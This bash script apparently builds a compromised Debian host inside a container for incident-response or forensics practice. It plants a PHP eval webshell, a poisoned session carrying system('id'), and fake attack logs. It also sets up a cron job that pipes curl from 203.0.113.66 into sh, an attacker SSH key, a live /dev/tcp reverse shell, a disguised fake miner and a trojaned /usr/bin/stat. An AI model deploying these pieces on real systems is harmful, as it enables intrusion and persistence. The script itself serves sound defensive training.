#!/bin/bash
# Simulates a Debian host where PHP + phpMyAdmin were exploited via php2shell and
# then uninstalled. Run ONLY inside a throwaway container (see run.sh).
set -euo pipefail

[ -f /.dockerenv ] || { echo "refusing to run outside a container" >&2; exit 1; }

id mysql >/dev/null 2>&1 || useradd -r -M -d /nonexistent -s /bin/false mysql

# --- leftovers of the uninstalled stack ------------------------------------------
mkdir -p /etc/php/8.2/fpm/pool.d /var/lib/php/sessions /var/log/nginx /var/www/html \
         /etc/nginx/sites-enabled /usr/lib/mysql/plugin /var/spool/cron/crontabs
printf '[Session]\nsession.save_path = "/var/lib/php/sessions"\n' > /etc/php/8.2/fpm/php.ini
printf 'server {\n  root /var/www/html;\n  location ~ \\.php$ { fastcgi_pass unix:/run/php/php8.2-fpm.sock; }\n}\n' \
  > /etc/nginx/sites-enabled/default

# --- Chain A: poisoned session + LFI trigger in the access log -------------------
SID=exploitab12cd34ef56ab78cd90
printf 'upload_progress_x|a:5:{s:5:"files";a:1:{i:0;a:2:{s:10:"field_name";s:1:"f";s:4:"name";s:58:"<?php echo '"'"'___START___'"'"'; system('"'"'id'"'"'); echo 1;?>";}}}' \
  > /var/lib/php/sessions/sess_$SID
chown www-data:www-data /var/lib/php/sessions/sess_$SID
{
  echo '203.0.113.66 - - [20/Oct/2026:13:22:01 +0000] "POST /index.php HTTP/1.1" 200 22 "-" "python-requests/2.31"'
  echo "203.0.113.66 - - [20/Oct/2026:13:22:02 +0000] \"GET /vuln.php?page=/var/lib/php/sessions/sess_$SID HTTP/1.1\" 200 98 \"-\" \"python-requests/2.31\""
  for i in $(seq 1 40); do
    echo "198.51.100.23 - - [19/Oct/2026:02:0$((i % 10)):00 +0000] \"POST /phpmyadmin/index.php HTTP/1.1\" 200 4000 \"-\" \"Mozilla/5.0\""
  done
  echo '198.51.100.23 - - [19/Oct/2026:02:11:00 +0000] "GET /phpmyadmin/index.php?route=/sql&db=mysql HTTP/1.1" 200 9000 "-" "Mozilla/5.0"'
  for i in $(seq 1 8); do
    echo "203.0.113.66 - - [20/Oct/2026:14:0$i:00 +0000] \"POST /wp-content/uploads/2026/10/cache.php HTTP/1.1\" 200 31 \"-\" \"antSword/v2.1\""
  done
  echo '192.0.2.10 - - [20/Oct/2026:15:00:00 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"'
} > /var/log/nginx/access.log
echo '203.0.113.99 - - [10/Oct/2026:01:00:00 +0000] "GET /x.php?cmd=id HTTP/1.1" 404 0 "-" "curl/8"' \
  | gzip > /var/log/nginx/access.log.3.gz
cat > /var/log/php8.2-fpm.log <<'EOF'
[20-Oct-2026 13:25:11] WARNING: [pool www] child 4242 exited on signal 11 (SIGSEGV) after 3.1 seconds from start
[20-Oct-2026 13:25:12] WARNING: [pool www] child 4243 said into stderr: "PHP Warning:  session_start(): Session object destruction failed in Unknown on line 0"
EOF

# --- webshell (inert now that PHP is gone) and MySQL post-exploitation ------------
mkdir -p /var/www/html/wp-content/uploads/2026/10
echo '<?php @eval($_POST["ant"]);?>' > /var/www/html/wp-content/uploads/2026/10/cache.php
echo '<?php echo "hello";' > /var/www/html/index.php
printf '\x7fELF....sys_exec....sys_eval' > /usr/lib/mysql/plugin/udf.so

# --- persistence that survives removing PHP ----------------------------------------
echo '*/5 * * * * curl -fsSL http://203.0.113.66/x.sh | sh' > /var/spool/cron/crontabs/www-data
mkdir -p /var/www/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl attacker@kali' \
  > /var/www/.ssh/authorized_keys
echo 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' > /tmp/rce_proof.txt

# --- live attacker processes ---------------------------------------------------------
# a listener standing in for the attacker's machine
# (connect to the container's own non-loopback address, like a real reverse shell would)
ATTACKER=$(python3 -c "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('192.0.2.1',9));print(s.getsockname()[0])")
python3 -c "import socket,time;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',4444));s.listen(5);time.sleep(3600)" &
sleep 1
# reverse shell as www-data: bash holding a TCP socket (": " stops bash exec-ing sleep)
su -s /bin/bash www-data -c "nohup bash -c 'exec 3<>/dev/tcp/$ATTACKER/4444; sleep 3600; :' >/dev/null 2>&1 &"
# miner-style binary in a hidden temp dir, disguised as a kernel thread
# (/dev/shm is mounted noexec in Docker, so use /var/tmp)
mkdir -p /var/tmp/.ICE-cache && cp /bin/cat /var/tmp/.ICE-cache/kworker
(sleep 3600 | (exec -a '[kworker/0:1]' /var/tmp/.ICE-cache/kworker) &)
# self-deleting dropper
cp /bin/sleep /tmp/.dropper && (/tmp/.dropper 3600 &) && sleep 0.5 && rm -f /tmp/.dropper

# --- trojaned system binary (rootkit-style) ----------------------------------------
printf '\n# trojan\n' >> /usr/bin/stat

sleep 1
echo "IOCs planted"
